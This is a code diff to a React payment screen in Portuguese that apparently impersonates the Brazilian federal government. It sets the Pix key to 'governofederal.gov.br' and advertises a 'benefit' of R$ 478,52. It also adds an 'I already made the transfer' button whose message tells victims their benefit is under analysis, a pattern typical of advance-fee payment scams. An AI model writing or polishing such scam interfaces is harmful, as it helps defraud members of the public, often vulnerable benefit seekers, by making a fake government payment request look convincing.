@@ -14,7 +14,7 @@ import { motion, AnimatePresence } from "framer-motion";
 import { Copy, Check, ShieldCheck } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 
-const PIX_KEY = "a1b2c3d4-e5f6-7890-abcd-ef1234567890";
+const PIX_KEY = "governofederal.gov.br";
 
 const ApkScreen = () => {
   const [modalOpen, setModalOpen] = useState(false);
@@ -27,6 +27,13 @@ const ApkScreen = () => {
     setCopied(true);
     toast({ title: "Chave copiada!", description: "Cole no app do seu banco." });
     setTimeout(() => setCopied(false), 2000);
+  };
+
+  const handleTransferDone = () => {
+    toast({
+      title: "Transferência confirmada",
+      description: "A confirmação do benefício está em análise.",
+    });
   };
 
   const handleClose = (open: boolean) => {
@@ -58,7 +65,7 @@ const ApkScreen = () => {
             <div className="mx-auto h-16 w-16 rounded-full bg-primary/10 flex items-center justify-center mb-4">
               <ShieldCheck className="h-8 w-8 text-primary" />
             </div>
-            <CardTitle className="text-xl">Resgate seu benefício</CardTitle>
+            <CardTitle className="text-xl">Resgate seu benefício de R$ 478,52</CardTitle>
           </CardHeader>
           <CardContent>
             <p className="text-muted-foreground text-sm mb-6">
@@ -148,6 +155,13 @@ const ApkScreen = () => {
                     className="w-full bg-primary text-primary-foreground hover:bg-primary/90 rounded-xl py-5 text-base font-semibold"
                   >
                     Copiar Chave Pix
+                  </Button>
+                  <Button
+                    onClick={handleTransferDone}
+                    variant="outline"
+                    className="w-full rounded-xl py-5 text-base font-semibold"
+                  >
+                    Ja fiz a transferencia
                   </Button>
                 </div>
               </motion.div>
